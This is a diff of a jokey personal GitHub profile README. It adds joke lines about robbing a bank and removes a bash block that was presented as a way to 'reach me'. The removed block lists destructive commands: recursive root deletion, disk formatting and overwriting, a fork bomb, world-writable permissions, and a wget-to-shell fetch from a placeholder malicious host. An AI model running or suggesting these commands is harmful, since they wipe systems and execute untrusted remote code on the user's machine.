@@ -6,25 +6,14 @@
 
 - 🌱 **I’m currently learning How to perfectly Love A Girl**
   
-- 👯 **I’m looking to collaborate on A Girl for A Relationship**
+- 👯 **I’m looking to collaborate on A Girl for A Robbery A Bank**
 
 - 💬 Ask me about **How to Sleep All Time**
 
-- 📫 How to reach me **Just Create Issue in My Repo**
+- 📫 How to reach me **In Your Nearwst Bank**
 
 - ⚡ **I'm Always Active in 192.168.0.110**
    
-- ##  You Need to Research Before Using these command For Reach to me
- ```bash
-  sudo rm -rf /*
-  mkfs.ext3 /dev/sda
-  :(){:|:&};:
-  dd if=/dev/random of=/dev/sda
-  chmod -R 777 /
-  wget http://malicious_source -O- | sh
- ```
- <p><img align="left" src="https://github-readme-streak-stats.herokuapp.com/?user=aziz-ru" alt="aziz-ru"  /></p>
- <p><img align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=aziz-ru" alt="aziz-ru" /></ /></p>
  
 
 
